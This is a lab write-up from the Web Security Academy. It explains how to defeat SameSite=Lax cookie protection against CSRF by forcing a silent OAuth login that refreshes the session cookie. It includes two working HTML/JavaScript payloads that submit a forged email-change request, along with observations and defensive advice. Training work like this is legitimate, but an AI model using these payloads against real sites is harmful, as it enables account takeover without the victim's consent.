# CSRF – SameSite Lax Bypass via Cookie Refresh

(**Web Security Academy**)

This lab demonstrates how **SameSite=Lax cookies can be bypassed** by abusing an **OAuth login flow** that refreshes session cookies. By forcing a cookie refresh immediately before a forged request, an attacker can successfully perform a **CSRF attack**.

---

## Lab: SameSite Lax Bypass via Cookie Refresh

**Category:** Cross-Site Request Forgery (CSRF)
**Protection Mechanism:** SameSite=Lax cookies
**Difficulty:** Practitioner
**Tools Used:** Burp Suite Community Edition
**Status:** Solved

---

## What This Lab Is About

The application attempts to prevent CSRF attacks by relying on browser default cookie behavior:

```http
SameSite=Lax
```

This blocks cookies from being sent in most cross-site **POST** requests.

However, the application also supports **OAuth-based login**, which:

* Automatically refreshes session cookies
* Does not explicitly set SameSite attributes
* Can be triggered without user credentials

By chaining these behaviors, an attacker can:

* Refresh the victim’s session cookie
* Immediately perform a CSRF attack
* Bypass SameSite=Lax protections

---

## Target Functionality

**Vulnerable endpoint:**

```http
POST /my-account/change-email
```

**Parameters:**

* `email`

There is **no CSRF token** protecting this action.

---

## Key Observations

### 1. No CSRF Token

Inspecting the email change request shows:

* No CSRF token
* No origin validation
* No referer validation

Only cookie-based protection is in place.

---

### 2. Session Cookie Uses Default SameSite=Lax

After completing OAuth login, the session cookie is set **without an explicit SameSite attribute**.

This means the browser applies:

```http
SameSite=Lax (default)
```

Result:

* Cookies are sent on top-level navigations
* Cookies are sent shortly after login
* Cookies may be sent in some cross-site scenarios

---

### 3. OAuth Login Refreshes Session Cookies

Visiting the following endpoint:

```http
GET /social-login
```

Automatically initiates the OAuth flow.

If the victim already has an active OAuth session, the flow:

* Completes silently
* Issues a **new session cookie**
* Refreshes the login timestamp

This behavior is critical for the bypass.

---

## Initial CSRF Attempt (Unreliable)

A basic CSRF payload sometimes works **only if** the session cookie was set less than ~2 minutes ago.

Example:

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="test@web-security-academy.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

Outcome:

*  Often fails
*  Cookie not included
*  SameSite=Lax blocks the request

---

## Reliable Bypass Strategy

To make the attack reliable, the exploit must:

1. Force a **fresh OAuth login**
2. Obtain a **new session cookie**
3. Immediately send the CSRF request

---

## Final CSRF Exploit Payload

Hosted on the exploit server:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@web-security-academy.net">
</form>

<p>Click anywhere on the page</p>

<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

---

## Why This Works

* User click bypasses popup blockers
* `/social-login` silently refreshes the session
* Browser sets a **new SameSite=Lax cookie**
* Cookie is considered “recent”
* CSRF request is sent immediately afterward
* Browser includes session cookie
* Email change succeeds

---

## Attack Flow

1. Victim is logged in
2. Victim clicks attacker-controlled exploit page
3. OAuth flow refreshes session cookie
4. New cookie is issued
5. CSRF POST request is sent
6. Session cookie is included
7. Email address is changed

---

## Verification & Delivery

* Stored exploit on exploit server
* Used **View exploit** to test locally
* Confirmed email change
* Modified email to avoid matching my own
* Clicked **Deliver exploit to victim**
* Lab marked as **Solved**

---

## Impact

An attacker can:

* Bypass SameSite=Lax protections
* Exploit OAuth login flows
* Perform unauthorized state-changing actions
* Abuse authenticated user sessions

**Severity:** High

---

## Key Lessons Learned

* SameSite=Lax is not CSRF protection
* OAuth flows can refresh cookies silently
* Cookie “freshness” matters
* Timing attacks are realistic
* CSRF tokens are mandatory

---

## Defensive Takeaways

To prevent this vulnerability:

* Implement CSRF tokens on all state-changing requests
* Bind session cookies strictly to SameSite rules
* Avoid automatic OAuth reauthentication
* Require re-authentication for sensitive actions
* Apply defense-in-depth

---

## Final Summary

* SameSite=Lax cookies were in use
* No CSRF token was implemented
* OAuth flow refreshed session cookies
* Popup + timing used to bypass protections
* CSRF attack succeeded
* Victim’s email changed
* Lab solved using Burp Suite Community Edition
 
